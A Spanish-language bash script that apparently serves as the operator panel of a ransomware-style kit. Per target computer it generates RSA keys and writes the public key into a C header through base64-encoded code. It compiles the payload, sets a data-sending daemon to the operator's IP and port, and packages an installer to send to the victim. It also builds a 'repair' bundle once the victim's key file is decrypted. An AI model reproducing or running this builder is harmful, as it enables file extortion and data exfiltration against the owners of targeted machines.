echo "Panel de administracion"

echo "Que quieres hacer"
echo "1) Agregar Computador"
echo "2) Leer llave RSA"
echo "3) Restaurar Computador"

read -p "Opción: " RSP

if [[ $RSP == "1" ]]
then
	read -p "Computador: " COMPU

	read -p "Contraseña: " PASSWD

	echo "[*] Generando RSA"
	RSA=`openssl genrsa 4096`

	echo "Asunto: "$COMPU
	echo -ne "\nGuardando mensaje\n"

	echo "$RSA" | openssl enc -aes-256-cbc -pass pass:$PASSWD -out keys/$COMPU.key 2>/dev/null

	echo "[*] Extrayendo la clave publica e.e"
	PKEY=`echo "$RSA" | openssl rsa -outform PEM -pubout`
	PFKEY=`echo "$PKEY" | grep -v "PUBLIC KEY" | tr -d '\n'`
	KEY_PUB_H='../src/llbis/key_pub.h'
	#KEY_PUB_H='a.txt'
	echo "dm9pZCBrZXlfcHViKGludCBpKXsKICAgIGNoYXIgKiBwdWJfa2V5ID0gewogICAgICAgICItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuIgoJIg==" | base64 -d > $KEY_PUB_H
	echo -n "$PFKEY" >> $KEY_PUB_H
	echo "XG4iCiAgICAgICAgIi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIKICAgIH07CiAgICBpZihpID09IDEpewogICAgICAgIGludCBmZCA9IG9wZW4oImNsYXZlLnB1Yi5wZW0iLCBPX0NSRUFUfCBPX1dST05MWSwgMDYwMCk7CiAgICAgICAgd3JpdGUoZmQsIHB1Yl9rZXksIHN0cmxlbihwdWJfa2V5KSk7CiAgICAgICAgY2xvc2UoZmQpOwogICAgICAgIGZzeW5jKGZkKTsKICAgIH0gZWxzZSBpZihpID09IDApewogICAgICAgIGNoYXIgKiBteWFyZ3NbXSA9IHsicm0iLCAiLWYiLCJjbGF2ZS5wdWIucGVtIiwgKGNoYXIgKilOVUxMfTsKICAgICAgICAKICAgICAgICBpbnQgZmMgPSBmb3JrKCk7CgogICAgICAgIGlmIChmYyA9PSAwKSB7CiAgICAgICAgICAgIGV4ZWN2KCIvYmluL3JtIiwgbXlhcmdzKTsKICAgICAgICB9IGVsc2UgaWYgKGZjIDwgMCkgewogICAgICAgICAgICBwZXJyb3IoIkVycm9yIG9uIGZvcmtpbmciKTsKICAgICAgICAgICAgZXhpdCg5KTsKICAgICAgICB9CiAgICB9Cn0K" | base64 -d >> $KEY_PUB_H

	echo "[*] Key Pub Actualizada"

	echo "[*] Compilando principal.c"

	gcc ../src/principal.c -o ../bin/principal

	echo "[*] Compilacion completa"

	echo "[*] Generando install.sh"
	cp ../install_client/install.sh ../bin/

	echo "[*] Generando Daemon"

	echo "Seleccione su IP de red"
	for i in `ifconfig | grep "inet " | cut -d " " -f 10`
	do
		echo "*) $i"
	done
	read -p "IP: " LHOST
	echo "Ingrese puerto para envio de datos"
	read -p "Puerto: " LPORT
	echo "$LHOST:$LPORT"
	cat ../Daemon/nottoday | sed s/'\[IP\]'/$LHOST/g | sed s/'\[PORT\]'/$LPORT/g > ../bin/nottoday

	echo "[*] Comprimiendo..."
	cd ../bin/
	zip ${COMPU}_install.zip install.sh nottoday principal
	rm -rf install.sh nottoday principal
	echo "[*] Configuracion Completa"
	echo "El archivo zip se encuentra en: "`cd ../bin;pwd`"/${COMPU}_install.zip"
	echo "Envie el archivo a la computadora, extraiga y ejecute el archivo install.sh"

fi

if [[ $RSP == "2" ]]
then
	echo "Cual de todas quieres leer?"
	for i in `ls keys`
	do
		echo "*) "${i::-4}
	done
	read -p 'Computador: ' COMPU
	read -p 'Contraseña: ' PASSWD

	echo "======================="
	echo "[*] Mostrando:"
	openssl enc -aes-256-cbc -d -pass pass:$PASSWD -in keys/$COMPU.key 2>/dev/null
	echo "======================="
fi

if [[ $RSP == "3" ]]
then
        echo "Que computador quieres restaurar?"
        for i in `ls keys`
        do
                echo "*) "${i::-4}
        done
        read -p 'Computador: ' COMPU
        read -p 'Contraseña: ' PASSWD
	read -p 'Ruta del enviame.enc[ ./ por defecto ]: ' ENVIAME
        echo "======================="
        echo "[*] Desencriptando:"
        RSA=`openssl enc -aes-256-cbc -d -pass pass:$PASSWD -in keys/$COMPU.key 2>/dev/null`
	echo "$RSA" > /tmp/clave.pem
	cat $ENVIAME/enviame.enc | base64 -d | openssl rsautl -decrypt -inkey /tmp/clave.pem > ../bin/key.txt
	rm /tmp/clave.pem
	echo "[*] Comprimiendo..."
	cp ../recuperacion/repa.sh ../bin/repa.sh
	cd ../bin
	zip ${COMPU}_repair.zip repa.sh key.txt
	rm repa.sh key.txt
        echo "[*] Compresion Completa"
	echo "El archivo zip se encuentra en: "`cd ../bin;pwd`"/${COMPU}_repair.zip"
        echo "Envie el archivo a la computadora, extraiga y ejecute el archivo repa.sh"
	echo -ne "\n=======================\n"
fi
